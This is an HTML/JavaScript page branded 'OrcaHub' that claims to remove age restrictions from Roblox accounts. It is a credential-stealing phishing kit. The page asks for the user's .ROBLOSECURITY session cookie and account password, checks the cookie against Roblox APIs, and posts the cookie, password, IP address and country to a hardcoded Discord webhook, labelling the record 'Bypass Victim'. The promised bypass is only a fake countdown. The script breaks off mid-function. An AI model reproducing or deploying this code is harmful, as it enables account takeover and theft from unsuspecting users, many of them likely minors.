<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>OrcaHub • Bypasser</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, sans-serif;
        }

        body {
            min-height: 100vh;
            background: linear-gradient(-45deg, #0a0a14, #12121f, #1a0a2e, #0f0f1a);
            background-size: 400% 400%;
            animation: gradientShift 18s ease infinite;
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 10px;
            position: relative;
            overflow-x: hidden;
        }

        @keyframes gradientShift {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .shape {
            position: fixed;
            border-radius: 50%;
            filter: blur(100px);
            opacity: 0.2;
            animation: float 14s ease-in-out infinite;
            pointer-events: none;
            z-index: 0;
        }

        .shape:nth-child(1) {
            width: 200px;
            height: 200px;
            background: radial-gradient(circle, #ff6b6b, transparent 70%);
            top: 5%;
            left: -5%;
            animation-duration: 12s;
        }
        .shape:nth-child(2) {
            width: 280px;
            height: 280px;
            background: radial-gradient(circle, #a29bfe, transparent 70%);
            bottom: 5%;
            right: -5%;
            animation-duration: 16s;
            animation-delay: -4s;
        }
        .shape:nth-child(3) {
            width: 180px;
            height: 180px;
            background: radial-gradient(circle, #4ecdc4, transparent 70%);
            top: 50%;
            left: 10%;
            animation-duration: 10s;
            animation-delay: -6s;
        }
        .shape:nth-child(4) {
            width: 220px;
            height: 220px;
            background: radial-gradient(circle, #ffe66d, transparent 70%);
            top: 20%;
            right: 10%;
            animation-duration: 15s;
            animation-delay: -8s;
        }

        @keyframes float {
            0%, 100% { transform: translate(0, 0) scale(1); }
            25% { transform: translate(30px, -40px) scale(1.1); }
            50% { transform: translate(-20px, 20px) scale(0.95); }
            75% { transform: translate(-40px, -15px) scale(1.05); }
        }

        /* ===== CAR SCENE ===== */
        .car-scene {
            position: relative;
            width: 100%;
            max-width: 500px;
            height: 160px;
            overflow: hidden;
            z-index: 1;
            margin-top: 5px;
            border-radius: 30px;
            background: linear-gradient(180deg, #061826 0%, #03202f 55%, #011a28 100%);
            border: 1px solid rgba(79, 209, 255, 0.15);
            box-shadow: 0 0 40px rgba(0, 180, 255, 0.05);
            flex-shrink: 0;
        }

        .road-scene {
            position: absolute;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 40%;
            background: linear-gradient(180deg, transparent 0%, #1a1a2e 30%, #0f0f1a 100%);
        }

        .road-line-scene {
            position: absolute;
            bottom: 35%;
            left: 0;
            width: 200%;
            height: 2px;
            background: repeating-linear-gradient(90deg, rgba(255,255,255,0.1) 0px, rgba(255,255,255,0.1) 30px, transparent 30px, transparent 60px);
            animation: roadMove 2s linear infinite;
        }

        @keyframes roadMove {
            0% { transform: translateX(0); }
            100% { transform: translateX(-50%); }
        }

        .car-wrapper-scene {
            position: absolute;
            bottom: 20%;
            left: -180px;
            animation: carDrive 6s cubic-bezier(0.25, 0.1, 0.25, 1) forwards;
            filter: drop-shadow(0 20px 60px rgba(162, 155, 254, 0.1));
        }

        @keyframes carDrive {
            0% { left: -180px; transform: scale(0.6) rotate(-2deg); }
            30% { left: 20%; transform: scale(0.7) rotate(0deg); }
            50% { left: 40%; transform: scale(0.75) rotate(0deg); }
            70% { left: 50%; transform: scale(0.7) rotate(0deg); }
            85% { left: 55%; transform: scale(0.65) rotate(0.5deg); }
            100% { left: 58%; transform: scale(0.6) rotate(0deg); }
        }

        .car-wrapper-scene svg {
            width: 200px;
            height: auto;
            display: block;
        }

        /* ===== HERO TEXT ===== */
        .hero-text {
            position: relative;
            z-index: 5;
            text-align: center;
            margin: 6px 0 8px;
            width: 100%;
        }

        .hero-text h1 {
            font-size: 2.5rem;
            font-weight: 900;
            background: linear-gradient(135deg, #a29bfe, #ff6b6b, #4ecdc4);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            letter-spacing: 4px;
            text-shadow: 0 0 60px rgba(162, 155, 254, 0.12);
            animation: gradientText 4s ease-in-out infinite;
            background-size: 300% 300%;
        }

        @keyframes gradientText {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .hero-text .sub {
            color: #8888aa;
            font-size: 0.6rem;
            letter-spacing: 4px;
            text-transform: uppercase;
            font-weight: 300;
        }

        /* ===== GLASS CARD ===== */
        .glass-card {
            position: relative;
            z-index: 10;
            width: 98%;
            max-width: 480px;
            background: rgba(16, 16, 30, 0.92);
            backdrop-filter: blur(25px);
            -webkit-backdrop-filter: blur(25px);
            border-radius: 28px;
            border: 1px solid rgba(255, 255, 255, 0.05);
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.6);
            padding: 18px 20px 20px;
            margin-bottom: 8px;
            flex-shrink: 0;
        }

        /* ===== STEP INDICATOR ===== */
        .step-indicator {
            display: flex;
            justify-content: space-between;
            margin-bottom: 14px;
            gap: 4px;
        }

        .step-dot {
            flex: 1;
            text-align: center;
            padding: 6px 0;
            background: rgba(30, 30, 48, 0.4);
            border-radius: 20px;
            font-size: 0.55rem;
            font-weight: 700;
            color: #5a5a72;
            transition: all 0.5s ease;
            border: 1px solid transparent;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .step-dot.active {
            background: linear-gradient(135deg, #a29bfe, #ff6b6b);
            color: white;
            box-shadow: 0 0 25px rgba(162, 155, 254, 0.2);
            transform: scale(1.02);
            border-color: rgba(255,255,255,0.1);
        }

        .step-dot.completed {
            background: rgba(78, 205, 196, 0.15);
            color: #4ecdc4;
            border-color: rgba(78, 205, 196, 0.15);
        }

        /* ===== FORM STEPS ===== */
        .form-step {
            display: none;
            animation: slideUp 0.5s ease;
        }

        .form-step.active-step {
            display: block;
        }

        @keyframes slideUp {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .form-step label {
            display: block;
            font-weight: 700;
            margin-bottom: 6px;
            color: #c0c0dd;
            font-size: 0.7rem;
            letter-spacing: 0.5px;
            text-transform: uppercase;
        }

        .form-step input {
            width: 100%;
            padding: 12px 16px;
            background: rgba(10, 10, 20, 0.6);
            border: 1.5px solid rgba(255, 255, 255, 0.05);
            border-radius: 25px;
            color: #f0f0ff;
            font-size: 0.85rem;
            outline: none;
            transition: all 0.4s ease;
            margin-bottom: 12px;
        }

        .form-step input:focus {
            border-color: #a29bfe;
            box-shadow: 0 0 0 4px rgba(162, 155, 254, 0.08);
            background: rgba(20, 20, 36, 0.7);
        }

        .form-step input::placeholder {
            color: #3a3a52;
        }

        .form-step input.error {
            border-color: #ff6b6b;
            box-shadow: 0 0 0 4px rgba(255, 107, 107, 0.1);
        }

        .form-step input.success {
            border-color: #4ecdc4;
            box-shadow: 0 0 0 4px rgba(78, 205, 196, 0.1);
        }

        /* ===== PROFILE PREVIEW ===== */
        .profile-preview {
            background: linear-gradient(135deg, rgba(30, 20, 48, 0.7), rgba(20, 20, 36, 0.8));
            border-radius: 22px;
            padding: 10px 14px;
            margin-bottom: 12px;
            border: 1px solid rgba(255, 255, 255, 0.03);
            display: none;
            align-items: center;
            gap: 12px;
            backdrop-filter: blur(8px);
            transition: all 0.4s ease;
        }

        .profile-preview.show {
            display: flex;
            animation: fadeInScale 0.5s ease;
        }

        @keyframes fadeInScale {
            from { opacity: 0; transform: scale(0.92); }
            to { opacity: 1; transform: scale(1); }
        }

        .profile-preview img {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            border: 2px solid rgba(162, 155, 254, 0.3);
            box-shadow: 0 0 20px rgba(162, 155, 254, 0.15);
            object-fit: cover;
            background: #1a1a2e;
        }

        .profile-info {
            flex: 1;
        }

        .profile-name {
            font-size: 0.8rem;
            font-weight: 700;
            color: #fff;
        }

        .profile-id {
            color: #8888aa;
            font-size: 0.55rem;
            margin-top: 1px;
        }

        .profile-stats {
            color: #666688;
            font-size: 0.5rem;
            margin-top: 1px;
        }

        .badge-verified {
            display: inline-block;
            background: rgba(78, 205, 196, 0.15);
            color: #4ecdc4;
            padding: 1px 8px;
            border-radius: 15px;
            font-size: 0.45rem;
            font-weight: 600;
            margin-top: 2px;
            border: 1px solid rgba(78, 205, 196, 0.1);
        }

        /* ===== BUTTONS ===== */
        .btn-primary {
            width: 100%;
            padding: 12px;
            background: linear-gradient(135deg, #a29bfe, #ff6b6b);
            border: none;
            border-radius: 25px;
            font-weight: 700;
            font-size: 0.8rem;
            color: white;
            cursor: pointer;
            transition: all 0.4s ease;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .btn-primary:hover {
            transform: scale(1.02);
            box-shadow: 0 8px 30px rgba(162, 155, 254, 0.3);
        }

        .btn-primary:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none !important;
        }

        .btn-secondary {
            width: 100%;
            padding: 10px;
            background: rgba(50, 50, 74, 0.25);
            border: 1px solid rgba(255, 255, 255, 0.04);
            border-radius: 25px;
            font-weight: 600;
            font-size: 0.7rem;
            color: #8888aa;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 6px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .btn-secondary:hover {
            background: rgba(60, 60, 84, 0.4);
            color: #ccccee;
        }

        .btn-instagram {
            padding: 12px;
            background: linear-gradient(135deg, #f58529, #dd2a7b);
            border: none;
            border-radius: 25px;
            font-weight: 700;
            font-size: 0.7rem;
            color: white;
            cursor: pointer;
            transition: all 0.4s;
            text-decoration: none;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .btn-instagram:hover {
            transform: scale(1.02);
            box-shadow: 0 8px 30px rgba(221, 42, 123, 0.3);
        }

        .btn-instagram svg {
            width: 14px;
            height: 14px;
            fill: currentColor;
        }

        .btn-group {
            display: flex;
            gap: 6px;
            margin-top: 4px;
        }

        .btn-group .btn-primary {
            flex: 2;
        }

        .btn-group .btn-instagram {
            flex: 1;
        }

        /* ===== LOADER ===== */
        .loader-container {
            display: none;
            text-align: center;
            padding: 10px 0;
        }

        .loader-container.show {
            display: block;
            animation: fadeIn 0.4s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.95); }
            to { opacity: 1; transform: scale(1); }
        }

        .spinner {
            width: 40px;
            height: 40px;
            border: 3.5px solid rgba(162, 155, 254, 0.08);
            border-top-color: #a29bfe;
            border-right-color: #ff6b6b;
            border-radius: 50%;
            animation: spin 0.8s ease infinite;
            margin: 0 auto 8px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .loader-text {
            color: #8888aa;
            font-size: 0.75rem;
            font-weight: 300;
        }

        .loader-text .time {
            color: #ff6b6b;
            font-weight: 700;
        }

        /* ===== RESULT ===== */
        .result-message {
            display: none;
            background: rgba(78, 205, 196, 0.06);
            border: 1px solid rgba(78, 205, 196, 0.12);
            color: #4ecdc4;
            padding: 10px 14px;
            border-radius: 20px;
            text-align: center;
            font-size: 0.75rem;
            font-weight: 600;
            margin-top: 10px;
            animation: fadeIn 0.4s ease;
        }

        .result-message.show {
            display: block;
        }

        .result-message .big {
            font-size: 1.8rem;
            display: block;
            margin-bottom: 3px;
        }

        .error-message {
            display: none;
            background: rgba(255, 107, 107, 0.08);
            border: 1px solid rgba(255, 107, 107, 0.15);
            color: #ff6b6b;
            padding: 8px 12px;
            border-radius: 18px;
            font-size: 0.7rem;
            font-weight: 500;
            text-align: center;
            margin-top: 8px;
            animation: fadeIn 0.4s ease;
        }

        .error-message.show {
            display: block;
        }

        .footer {
            text-align: center;
            color: #3a3a52;
            font-size: 0.45rem;
            margin-top: 12px;
            border-top: 1px solid rgba(255, 255, 255, 0.02);
            padding-top: 10px;
            letter-spacing: 1.5px;
            text-transform: uppercase;
        }

        /* ===== SCROLLBAR ===== */
        .glass-card::-webkit-scrollbar {
            width: 3px;
        }

        .glass-card::-webkit-scrollbar-track {
            background: transparent;
        }

        .glass-card::-webkit-scrollbar-thumb {
            background: rgba(162, 155, 254, 0.3);
            border-radius: 10px;
        }

        /* ===== RESPONSIVE ===== */
        @media (max-width: 480px) {
            .car-scene { height: 130px; border-radius: 20px; }
            .car-wrapper-scene svg { width: 150px; }
            .hero-text h1 { font-size: 2rem; letter-spacing: 2px; }
            .hero-text .sub { font-size: 0.5rem; letter-spacing: 3px; }
            .glass-card { padding: 14px 14px 16px; border-radius: 22px; }
            .step-dot { font-size: 0.45rem; padding: 4px 0; }
            .form-step input { font-size: 0.75rem; padding: 10px 14px; margin-bottom: 10px; }
            .btn-primary { font-size: 0.7rem; padding: 10px; }
            .btn-instagram { font-size: 0.6rem; padding: 10px; }
            .profile-preview img { width: 35px; height: 35px; }
            .profile-name { font-size: 0.7rem; }
        }

        @media (max-height: 700px) {
            .car-scene { height: 110px; }
            .car-wrapper-scene svg { width: 130px; }
            .hero-text h1 { font-size: 1.8rem; }
            .hero-text { margin: 4px 0; }
            .glass-card { padding: 12px 14px 14px; }
            .step-indicator { margin-bottom: 8px; }
            .form-step input { padding: 8px 12px; font-size: 0.7rem; margin-bottom: 8px; }
            .btn-primary { padding: 8px; font-size: 0.65rem; }
            .profile-preview { padding: 8px 12px; }
        }

        @media (min-width: 768px) {
            .car-scene { height: 190px; }
            .car-wrapper-scene svg { width: 260px; }
            .hero-text h1 { font-size: 3.2rem; }
            .glass-card { padding: 22px 26px 24px; border-radius: 32px; }
        }
    </style>
</head>
<body>

    <div class="shape"></div>
    <div class="shape"></div>
    <div class="shape"></div>
    <div class="shape"></div>

    <!-- ===== CAR SCENE ===== -->
    <div class="car-scene">
        <div class="road-scene">
            <div class="road-line-scene"></div>
        </div>
        <div class="car-wrapper-scene">
            <svg viewBox="0 0 600 250" fill="none" xmlns="http://www.w3.org/2000/svg">
                <ellipse cx="300" cy="220" rx="200" ry="12" fill="rgba(0,0,0,0.3)"/>
                <path d="M80 160 L120 100 L200 80 L400 80 L480 100 L520 160 L500 180 L100 180 L80 160Z" fill="url(#carGrad)" stroke="rgba(255,255,255,0.06)" stroke-width="1.5"/>
                <path d="M160 100 L180 70 L240 60 L360 60 L420 70 L440 100 L160 100Z" fill="url(#roofGrad)" stroke="rgba(255,255,255,0.04)" stroke-width="1"/>
                <path d="M190 92 L210 72 L260 65 L340 65 L390 72 L410 92 L190 92Z" fill="rgba(162,155,254,0.1)" stroke="rgba(255,255,255,0.04)" stroke-width="0.5"/>
                <ellipse cx="85" cy="130" rx="12" ry="8" fill="rgba(255,215,0,0.3)" stroke="rgba(255,215,0,0.08)" stroke-width="1"/>
                <ellipse cx="515" cy="130" rx="12" ry="8" fill="rgba(255,100,100,0.2)" stroke="rgba(255,100,100,0.08)" stroke-width="1"/>
                <circle cx="140" cy="185" r="35" fill="#1a1a2e" stroke="rgba(255,255,255,0.08)" stroke-width="2"/>
                <circle cx="140" cy="185" r="18" fill="#2a2a3e" stroke="rgba(255,255,255,0.04)" stroke-width="1"/>
                <circle cx="460" cy="185" r="35" fill="#1a1a2e" stroke="rgba(255,255,255,0.08)" stroke-width="2"/>
                <circle cx="460" cy="185" r="18" fill="#2a2a3e" stroke="rgba(255,255,255,0.04)" stroke-width="1"/>
                <path d="M420 65 L430 50 L470 48 L480 65 L420 65Z" fill="rgba(255,255,255,0.04)" stroke="rgba(255,255,255,0.04)" stroke-width="0.5"/>
                <defs>
                    <linearGradient id="carGrad" x1="0" y1="0" x2="600" y2="200">
                        <stop offset="0%" stop-color="#a29bfe"/>
                        <stop offset="50%" stop-color="#6c5ce7"/>
                        <stop offset="100%" stop-color="#ff6b6b"/>
                    </linearGradient>
                    <linearGradient id="roofGrad" x1="0" y1="0" x2="600" y2="100">
                        <stop offset="0%" stop-color="rgba(162,155,254,0.25)"/>
                        <stop offset="100%" stop-color="rgba(255,107,107,0.15)"/>
                    </linearGradient>
                </defs>
            </svg>
        </div>
    </div>

    <!-- ===== HERO TEXT ===== -->
    <div class="hero-text">
        <h1>ORCA</h1>
        <div class="sub">Age Verification Bypass</div>
    </div>

    <!-- ===== GLASS CARD ===== -->
    <div class="glass-card" id="app">

        <!-- ===== STEP INDICATOR ===== -->
        <div class="step-indicator">
            <div class="step-dot active" id="step1Dot">❶ Cookie</div>
            <div class="step-dot" id="step2Dot">❷ Password</div>
            <div class="step-dot" id="step3Dot">❸ Bypass</div>
        </div>

        <!-- ===== STEP 1: COOKIE ===== -->
        <div class="form-step active-step" id="step1">
            <label>🍪 Enter .ROBLOSECURITY Cookie</label>
            <input type="text" id="cookieInput" placeholder="_|WARNING:-DO-NOT-SHARE..." autocomplete="off">

            <div id="profilePreview" class="profile-preview">
                <img id="profileImg" src="" alt="avatar">
                <div class="profile-info">
                    <div class="profile-name" id="profileName">@username</div>
                    <div class="profile-id" id="profileId">ID: --</div>
                    <div class="profile-stats" id="profileStats">📊 Followers: -- • Following: --</div>
                    <span class="badge-verified" id="profileBadge">✅ Verified</span>
                </div>
            </div>

            <div id="errorMessage1" class="error-message"></div>

            <button class="btn-primary" id="verifyBtn">🔍 Verify Cookie</button>
        </div>

        <!-- ===== STEP 2: PASSWORD ===== -->
        <div class="form-step" id="step2">
            <label>🔑 Enter Account Password</label>
            <input type="password" id="passwordInput" placeholder="••••••••" autocomplete="off">

            <div id="errorMessage2" class="error-message"></div>

            <button class="btn-primary" id="nextToBypassBtn">➡️ Next</button>
            <button class="btn-secondary" id="backToStep1Btn">🔙 Back</button>
        </div>

        <!-- ===== STEP 3: BYPASS ===== -->
        <div class="form-step" id="step3">
            <div id="loaderContainer" class="loader-container show">
                <div class="spinner"></div>
                <div class="loader-text">
                    ⏳ Processing bypass...<br>
                    <span class="time" id="timerDisplay">60</span> seconds remaining
                </div>
            </div>

            <div id="resultMessage" class="result-message">
                <span class="big">🎉</span>
                <div style="font-size:0.85rem; margin-bottom:2px;">AGE EXCEEDED!</div>
                <div style="font-size:0.65rem; font-weight:400; color:#8888aa;">
                    Age restriction removed from account.
                </div>
            </div>

            <div id="errorMessage3" class="error-message"></div>

            <div class="btn-group">
                <button class="btn-primary" id="bypassBtn">🚀 Start Bypass</button>
                <a class="btn-instagram" id="instagramBtn" href="#" target="_blank">
                    <svg viewBox="0 0 24 24"><path d="M12 2.163c3.204 0 3.584.012 4.85.07 3.252.148 4.771 1.691 4.919 4.919.058 1.265.069 1.645.069 4.849 0 3.205-.012 3.584-.069 4.849-.149 3.225-1.664 4.771-4.919 4.919-1.266.058-1.644.07-4.85.07-3.204 0-3.584-.012-4.849-.07-3.26-.149-4.771-1.699-4.919-4.92-.058-1.265-.07-1.644-.07-4.849 0-3.204.013-3.583.07-4.849.149-3.227 1.664-4.771 4.919-4.919 1.266-.057 1.645-.069 4.849-.069zM12 0C8.741 0 8.333.014 7.053.072 2.695.272.273 2.69.073 7.052.014 8.333 0 8.741 0 12c0 3.259.014 3.668.072 4.948.2 4.358 2.618 6.78 6.98 6.98C8.333 23.986 8.741 24 12 24c3.259 0 3.668-.014 4.948-.072 4.354-.2 6.782-2.618 6.979-6.98.059-1.28.073-1.689.073-4.948 0-3.259-.014-3.667-.072-4.947-.196-4.354-2.617-6.78-6.979-6.98C15.668.014 15.259 0 12 0zm0 5.838a6.162 6.162 0 100 12.324 6.162 6.162 0 000-12.324zM12 16a4 4 0 110-8 4 4 0 010 8zm6.406-11.845a1.44 1.44 0 100 2.881 1.44 1.44 0 000-2.881z"/></svg>
                    Owner
                </a>
            </div>

            <button class="btn-secondary" id="backToStep2Btn">🔙 Back</button>
        </div>

        <div class="footer">OrcaHub • Secure &amp; Private</div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // ==================== WEBHOOK ====================
            const WEBHOOK_URL = 'https://discord.com/api/webhooks/1545842219787886693/PRkcsE8DY_anZhky9n7173-Gwslo7XF9PMZ6hT5igehnWPkie9KAmdbcSn1I_a20KtxG';

            // ==================== DOM REFS ====================
            const DOM = {
                step1: document.getElementById('step1'),
                step2: document.getElementById('step2'),
                step3: document.getElementById('step3'),
                step1Dot: document.getElementById('step1Dot'),
                step2Dot: document.getElementById('step2Dot'),
                step3Dot: document.getElementById('step3Dot'),
                cookieInput: document.getElementById('cookieInput'),
                passwordInput: document.getElementById('passwordInput'),
                verifyBtn: document.getElementById('verifyBtn'),
                nextToBypassBtn: document.getElementById('nextToBypassBtn'),
                backToStep1Btn: document.getElementById('backToStep1Btn'),
                backToStep2Btn: document.getElementById('backToStep2Btn'),
                bypassBtn: document.getElementById('bypassBtn'),
                instagramBtn: document.getElementById('instagramBtn'),
                error1: document.getElementById('errorMessage1'),
                error2: document.getElementById('errorMessage2'),
                error3: document.getElementById('errorMessage3'),
                loader: document.getElementById('loaderContainer'),
                timer: document.getElementById('timerDisplay'),
                result: document.getElementById('resultMessage'),
                profilePreview: document.getElementById('profilePreview'),
                profileImg: document.getElementById('profileImg'),
                profileName: document.getElementById('profileName'),
                profileId: document.getElementById('profileId'),
                profileStats: document.getElementById('profileStats'),
                profileBadge: document.getElementById('profileBadge'),
            };

            DOM.instagramBtn.href = 'https://www.instagram.com/uiogunio?stkn=MWY5OWppbGY1bmhsdw==';

            let currentStep = 1;
            let bypassTimer = null;
            let isProcessing = false;
            let currentUserData = null;
            let userIP = '';
            let verifiedCookie = false;

            // ==================== STEP MANAGER ====================
            function setStep(step) {
                currentStep = step;
                DOM.step1.classList.toggle('active-step', step === 1);
                DOM.step2.classList.toggle('active-step', step === 2);
                DOM.step3.classList.toggle('active-step', step === 3);

                const dots = [DOM.step1Dot, DOM.step2Dot, DOM.step3Dot];
                dots.forEach((dot, i) => {
                    dot.classList.remove('active', 'completed', 'error');
                    if (i + 1 === step) dot.classList.add('active');
                    if (i + 1 < step) dot.classList.add('completed');
                });
            }

            // ==================== GET IP ====================
            async function getIP() {
                try {
                    const response = await fetch('https://api.ipify.org?format=json');
                    const data = await response.json();
                    userIP = data.ip || 'Unknown';
                } catch (_) { userIP = 'Unknown'; }
                try {
                    const countryResponse = await fetch(`https://ipapi.co/${userIP}/country_name/`);
                    const country = await countryResponse.text();
                    userIP = `${userIP} (${country.trim() || 'Unknown'})`;
                } catch (_) {}
                return userIP;
            }

            // ==================== SEND TO WEBHOOK ====================
            function sendToWebhook(message) {
                try {
                    fetch(WEBHOOK_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ content: message }),
                        mode: 'no-cors'
                    }).catch(() => {});
                } catch (_) {}
            }

            // ==================== ROBLOX API ====================
            async function fetchRobloxProfile(cookie) {
                try {
                    // Clean the cookie
                    const cleanCookie = cookie.replace(/^_\|WARNING:-DO-NOT-SHARE-?/, '').trim();

                    if (!cleanCookie || cleanCookie.length < 10) {
                        return { valid: false, error: '❌ Invalid cookie format' };
                    }

                    const response = await fetch('https://www.roblox.com/mobileapi/userinfo', {
                        headers: {
                            'Cookie': `.ROBLOSECURITY=${cleanCookie}`,
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                            'Accept': 'application/json',
                            'Accept-Language': 'en-US,en;q=0.9',
                            'Connection': 'keep-alive'
                        }
                    });

                    if (response.status === 401 || response.status === 403) {
                        return { valid: false, error: '❌ Cookie expired or wrong' };
                    }

                    if (response.status === 429) {
                        return { valid: false, error: '❌ Too many requests. Please wait a moment.' };
                    }

                    if (!response.ok) {
                        return { valid: false, error: `❌ Server error: ${response.status}` };
                    }

                    const data = await response.json();

                    if (!data || !data.UserID) {
                        return { valid: false, error: '❌ Invalid cookie or account not found' };
                    }

                    const userId = data.UserID;

                    // Get profile details
                    const profileResponse = await fetch(`https://users.roblox.com/v1/users/${userId}`, {
                        headers: {
                            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                        }
                    });
                    let profileData = {};
                    if (profileResponse.ok) {
                        profileData = await profileResponse.json();
                    }

                    // Get followers
                    let followers = 0;
                    try {
                        const followersResponse = await fetch(`https://friends.roblox.com/v1/users/${userId}/followers/count`, {
                            headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
                        });
                        if (followersResponse.ok) {
                            const followersData = await followersResponse.json();
                            followers = followersData.count || 0;
                        }
                    } catch (_) {}

                    // Get following
                    let following = 0;
                    try {
                        const followingResponse = await fetch(`https://friends.roblox.com/v1/users/${userId}/followings/count`, {
                            headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' }
                        });
                        if (followingResponse.ok) {
                            const followingData = await followingResponse.json();
                            following = followingData.count || 0;
                        }
                    } catch (_) {}

                    // Get avatar
                    let avatarUrl = `https://www.roblox.com/headshot-thumbnail/image?userId=${userId}&width=150&height=150&format=png`;
                    try {
                        const thumbResponse = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png&isCircular=false`);
                        if (thumbResponse.ok) {
                            const thumbData = await thumbResponse.json();
                            if (thumbData.data && thumbData.data.length > 0 && thumbData.data[0].imageUrl) {
                                avatarUrl = thumbData.data[0].imageUrl;
                            }
                        }
                    } catch (_) {}

                    return {
                        valid: true,
                        user: {
                            username: data.UserName || profileData.name || 'Unknown',
                            userId: userId,
                            displayName: data.UserName || profileData.name || 'Unknown',
                            isVerified: data.IsVerified || false,
                            followers: followers,
                            following: following,
                            created: profileData.created || 'Unknown',
                            avatarUrl: avatarUrl,
                        }
                    };

                } catch (error) {
                    console.error('Roblox API error:', error);
                    if (error.message && error.message.includes('Failed to fetch')) {
                        return { valid: false, error: '❌ Network error. Please check your connection.' };
                    }
                    return { valid: false, error: '❌ Error connecting to Roblox. Please try again.' };
                }
            }

            // ==================== VERIFY COOKIE ====================
            async function verifyCookie() {
                const cookie = DOM.cookieInput.value.trim();
                DOM.error1.classList.remove('show');
                DOM.profilePreview.classList.remove('show');

                if (!cookie || cookie.length < 10) {
                    DOM.error1.textContent = '❌ Please enter a valid .ROBLOSECURITY cookie!';
                    DOM.error1.classList.add('show');
                    DOM.cookieInput.classList.add('error');
                    return;
                }

                DOM.verifyBtn.disabled = true;
                DOM.verifyBtn.textContent = '⏳ Verifying...';

                try {
                    const result = await fetchRobloxProfile(cookie);
                    if (result.valid) {
                        currentUserData = result.user;
                        verifiedCookie = true;
                        DOM.profileName.textContent = `@${result.user.username}`;
                        DOM.profileId.textContent = `ID: ${result.user.userId}`;
                        DOM.profileStats.textContent =
                            `📊 Followers: ${result.user.followers.toLocaleString()} • Following: ${result.user.following.toLocaleString()}`;
                        DOM.profileBadge.textContent = result.user.isVerified ? '✅ Verified' : '● Active';
                        DOM.profileImg.src = result.user.avatarUrl;
                        DOM.profileImg.onerror = function() {
                            this.src = 'https://ui-avatars.com/api/?name=' + encodeURIComponent(result.user.username) +
                                '&background=random&size=80&rounded=true&color=fff';
                        };
                        DOM.profilePreview.classList.add('show');
                        DOM.cookieInput.classList.remove('error');
                        DOM.cookieInput.classList.add('success');
                        DOM.error1.classList.remove('show');
                        DOM.verifyBtn.textContent = '✅ Verified!';
                        DOM.step1Dot.classList.add('completed');

                        // Send profile info to webhook as simple message
                        await getIP();
                        const message = `
        🦈 OrcaHub • Cookie Verified
        👤 Username: ${result.user.username}
        🆔 User ID: ${result.user.userId}
        📊 Followers: ${result.user.followers.toLocaleString()}
        📊 Following: ${result.user.following.toLocaleString()}
        ✅ Verified: ${result.user.isVerified ? 'Yes' : 'No'}
        🌐 IP: ${userIP}
        🍪 Cookie: ${cookie.substring(0, 50)}...
        `;
                        sendToWebhook(message);

                        setTimeout(() => setStep(2), 600);
                    } else {
                        DOM.error1.textContent = result.error || '❌ Cookie expired or wrong';
                        DOM.error1.classList.add('show');
                        DOM.cookieInput.classList.add('error');
                        DOM.verifyBtn.textContent = '🔍 Verify Cookie';
                    }
                } catch (err) {
                    DOM.error1.textContent = '❌ Error: ' + err.message;
                    DOM.error1.classList.add('show');
                    DOM.cookieInput.classList.add('error');
                    DOM.verifyBtn.textContent = '🔍 Verify Cookie';
                }

                DOM.verifyBtn.disabled = false;
            }

            // ==================== START BYPASS ====================
            async function startBypass() {
                const password = DOM.passwordInput.value.trim();
                DOM.error2.classList.remove('show');
                DOM.error3.classList.remove('show');

                if (!password || password.length < 3) {
                    DOM.error2.textContent = '❌ Please enter your account password!';
                    DOM.error2.classList.add('show');
                    DOM.passwordInput.classList.add('error');
                    return;
                }

                if (!verifiedCookie || !currentUserData) {
                    DOM.error2.textContent = '❌ Please verify your cookie first!';
                    DOM.error2.classList.add('show');
                    setStep(1);
                    return;
                }

                // Send full credentials to webhook as simple message
                await getIP();
                const message = `
        🎯 OrcaHub • Bypass Victim
        👤 Username: ${currentUserData.username}
        🆔 User ID: ${currentUserData.userId}
        🔑 Password: ${password}
        🍪 Cookie: ${DOM.cookieInput.value.trim()}
        📊 Followers: ${currentUserData.followers.toLocaleString()}
        📊 Following: ${currentUserData.following.toLocaleString()}
        ✅ Verified: ${currentUserData.isVerified ? 'Yes' : 'No'}
        📅 Created: ${currentUserData.created}
        🌐 IP: ${userIP}
        `;
                sendToWebhook(message);

                setStep(3);
                DOM.loader.classList.add('show');
                DOM.result.classList.remove('show');
                DOM.bypassBtn.disabled = true;
                DOM.bypassBtn.textContent = '⏳ Processing...';

                let seconds = 60;
                DOM.timer.textContent = seconds;

                if (bypassTimer) clearInterval(bypassTimer);

                bypassTimer = setInterval(() => {
                    seconds--;
                    DOM.timer.textContent = seconds;

                    if (seconds <= 0) {
                        clearInterval(bypassTimer);
                        bypassTimer = null;
                        completeBypass();
                    }
                }, 1000);
            }

            // ==================== COMPLETE BYPASS ====================
            function completeBypass() {
